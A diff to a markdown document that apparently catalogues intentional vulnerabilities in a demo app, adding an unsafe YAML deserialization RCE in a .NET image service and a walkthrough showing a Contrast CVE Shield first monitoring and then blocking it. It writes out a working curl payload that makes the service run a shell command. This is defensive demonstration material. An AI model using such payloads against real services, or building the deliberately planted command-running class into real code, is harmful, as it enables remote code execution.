@@ -17,6 +17,7 @@ This document details the intentional security vulnerabilities present in the Ca
 11. [XML External Entity (XXE) - Document Processing Service](#11-xml-external-entity-xxe---document-processing-service)
 12. [Untrusted Deserialization - Address Import Feature](#12-untrusted-deserialization---address-import-feature)
 13. [Server-Side Template Injection / RCE (CVE-2025-64087) - Report Service](#13-server-side-template-injection--rce-cve-2025-64087---report-service)
+14. [Unsafe YAML Deserialization / RCE (CVE-2018-1000210) - Image Service](#14-unsafe-yaml-deserialization--rce-cve-2018-1000210---image-service)
 
 ---
 
@@ -563,3 +564,55 @@ The report service uses XDocReport FreeMarker template engine v2.1.0, which allo
 - Data exfiltration (files, secrets, environment variables)
 - Lateral movement to other services in the cluster
 
+### 14. Unsafe YAML Deserialization / RCE (CVE-2018-1000210) - Image Service
+
+**Vulnerability Details:**
+The image service (.NET 8) uses YamlDotNet 4.3.2 to parse photo tags sent to `POST /importtags`. YamlDotNet before 5.0.0 instantiates any .NET type named in a YAML tag (CVE-2018-1000210). The service has a `ThumbnailHook` post-processing class whose `Command` setter runs a shell command, so a tags file that names it is Remote Code Execution.
+
+The image service also pins Newtonsoft.Json 12.0.3 (CVE-2024-21907) and parses photo metadata with it at `POST /photometa`, so normal use exercises a second vulnerable library.
+
+**Exploitation:**
+
+The image service has no ingress, so port-forward it first:
+
+```
+kubectl port-forward svc/imageservice 8081:80
+```
+
+1. Normal usage, which runs the vulnerable YamlDotNet method with no attack:
+   ```
+   curl -X POST localhost:8081/importtags --data-binary $'cat: whiskers\ncolor: orange\n'
+   ```
+2. Attack, which creates `/tmp/pwned` in the pod:
+   ```
+   curl -X POST localhost:8081/importtags --data-binary $'!<!ThumbnailHook,imageservice>\nCommand: touch /tmp/pwned\n'
+   kubectl exec deploy/cargocats-imageservice -- ls /tmp/pwned
+   ```
+
+**Impact:**
+- Remote code execution on the image service
+- Data exfiltration (uploaded photos, environment variables, service account token)
+- Lateral movement to other services in the cluster
+
+**Contrast CVE Shield demo (monitor, then block):**
+
+The CVE-2018-1000210 shield supports BLOCK. It watches `YamlDotNet.Serialization.Deserializer.Deserialize(IParser, Type)` and denies starting a process inside it, so BLOCK stops the payload while ordinary tags imports keep working. `./dotnet-shield-demo.sh` (repo root) runs every step and handles the port-forward:
+
+| Step | Command | Expected |
+|---|---|---|
+| 1. Fresh pod | `./dotnet-shield-demo.sh restart` | rollout succeeds |
+| 2. Warm up (normal usage) | `./dotnet-shield-demo.sh warm` | HTTP 200, then the shield the agent holds: `"Mode"`, `"MaxSupportedBehavior":"BLOCK"`, `"Denied":["process"]` |
+| 3. Set MONITOR in Contrast (Policies > CVE Shields), then attack | `./dotnet-shield-demo.sh exploit` | HTTP 200, `EXPLOITED: /tmp/pwned was created` |
+| 4. Reset | `./dotnet-shield-demo.sh clean` | removes `/tmp/pwned` |
+| 5. Set BLOCK in Contrast, then attack again | `./dotnet-shield-demo.sh exploit` | HTTP 500, `BLOCKED: /tmp/pwned was not created` |
+| 6. Agent evidence | `./dotnet-shield-demo.sh logs` | the shield definition, the `Entry` event, the `Capability` event (`process`) and `ShieldAttackBlockedException` |
+
+Notes:
+- Always run `warm` after `restart`. .NET loads YamlDotNet on first use, so the agent only discovers the library on the first `/importtags` call and fetches its shield shortly after. That first call is never shielded.
+- The agent picks up a MONITOR or BLOCK change on its next shield refresh, every 5 minutes by default. For a live demo, shorten it in `contrast-agent-operator-config.yaml` and re-apply it:
+  ```yaml
+  shield:
+    enable: true
+    refresh_interval_ms: 5000
+  ```
+- The .NET agent logs to `/contrast/data/logs/` in the pod. `*_Sensors_*.log` has the shield events, and the block appears in the app log (`kubectl logs deploy/cargocats-imageservice`).
